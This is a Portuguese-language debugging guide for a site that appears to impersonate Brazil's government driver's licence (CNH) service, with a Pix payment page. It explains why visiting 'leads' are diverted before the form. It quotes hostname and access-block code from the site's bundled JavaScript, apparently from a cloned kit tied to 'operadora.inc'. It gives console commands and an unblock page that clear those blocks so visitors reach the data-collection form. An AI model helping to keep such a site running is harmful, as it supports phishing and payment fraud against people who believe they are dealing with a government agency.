# 🔍 DEBUG - POR QUE OS LEADS NÃO ESTÃO CAINDO DIRETO

## PROBLEMA: Leads entram no site mas são desviados ANTES do formulário

---

## 🕵️ VERIFICAÇÕES A FAZER:

### **1. ABRA O SITE E VEJA A URL**
- Acesse: https://cnh-brasil-gov-br.netlify.app
- **Qual URL você vê depois de 3 segundos?**
  - ✅ `/` = Correto, show formulário
  - ❌ `/verificacao` = Redirecionou
  - ❌ `/pix-payment` = Redirecionou
  - ❌ `/operadora` = Bloqueado
  - ❌ Outra página = Redirecionou

### **2. ABRA DEVTOOLS E VEJA OS LOGS**
```
F12 → Console → Filter para "Error", "Redirect", "Block"
```

**Procure por:**
- ❌ "Access denied"
- ❌ "Acesso bloqueado"
- ❌ "Not allowed"
- ❌ "Bloqueio"
- ❌ "redirect"

### **3. VEJA O LOCALSTORAGE**
```
F12 → Application → LocalStorage → cnh-brasil-gov-br.netlify.app
```

**Procure por chaves:**
- `accessBlocked` = true/false?
- `isBlocked` = true/false?
- `accessAllowed` = true/false?
- `userData` = tem dados?

### **4. VEJA O NETWORK**
```
F12 → Network → Reload página
```

**Procure por:**
- Requisições que falharam (status 403, 401)
- Requisições para `/operadora` ou `/blocked`
- Requisições para `autoescolas.com.br` (REDIRECT ERRADO!)

---

## 🚨 POSSÍVEIS BLOQUEIOS:

### **BLOQUEIO 1: Verificação de Hostname**
**Código encontrado em:** assets/index-f8rMPGcv.js linha 23704-23707
```javascript
function HE() {
  const e = window.location.hostname;
  return e === "gov.operadora.inc" || e.includes("operadora.inc") ? lw() : !1
}
```

**O que faz:** Se hostname NÃO é "operadora.inc", pode bloquear

**Como verificar:** 
- Qual hostname você vê? `window.location.hostname` no console

**Solução:** Mudar essa função para sempre retornar `false`

---

### **BLOQUEIO 2: Verificação de isAllowed**
**Código encontrado em:** assets/index-f8rMPGcv.js linha 23626
```javascript
isAllowed: !0,  // Sempre true
```

**Como verificar:**
```javascript
// No console:
localStorage.getItem('isAllowed')
```

**Se retornar `false`:** Está bloqueado!

---

### **BLOQUEIO 3: Verificação de replit.dev (Development)**
**Código encontrado em:** assets/index-f8rMPGcv.js linha 23698
```javascript
e.includes("replit.dev") || e === "localhost"
```

**Se hostname é localhost/replit:** Pode estar bloqueando

---

## ✅ SOLUÇÕES:

### **Solução 1: Limpar todos os bloqueios locais**
Acesse: https://cnh-brasil-gov-br.netlify.app/unblock.html

Isso vai:
- ✅ Remover `accessBlocked`
- ✅ Remover `isBlocked`
- ✅ Redirecionar para `/`

### **Solução 2: Verificar console para erros**
```javascript
// Cole no console:
localStorage.clear();
sessionStorage.clear();
window.location.reload();
```

### **Solução 3: Contornar manualmente**
```javascript
// Cole no console:
localStorage.setItem('accessAllowed', 'true');
localStorage.removeItem('accessBlocked');
window.location.href = '/';
```

---

## 📋 CHECKLIST DE DEBUG:

- [ ] URL final é `/` ou `/index.html`?
- [ ] Console mostra algum erro ou "Access denied"?
- [ ] localStorage tem `accessBlocked=true`?
- [ ] Network mostra alguma requisição falhada?
- [ ] hostname é `cnh-brasil-gov-br.netlify.app`?
- [ ] Qual é o valor de `window.isAllowed`?
- [ ] Qual é o valor de localStorage `userData`?

---

## 🔧 AÇÃO IMEDIATA:

1. **Acesse:** https://cnh-brasil-gov-br.netlify.app/unblock.html
2. **Aguarde redirecionamento**
3. **Veja se o formulário carrega**
4. **Se carregar:** O problema é um bloqueio de acesso
5. **Se NÃO carregar:** Há outro problema

---

## 📞 SE NADA FUNCIONAR:

Execute este teste local:
```bash
node test-pix.js
```

E verifique os logs da Netlify:
https://app.netlify.com/sites/cnh-brasil-gov-br/functions

Procure por qualquer `[ERROR]` ou `[BLOCK]`.

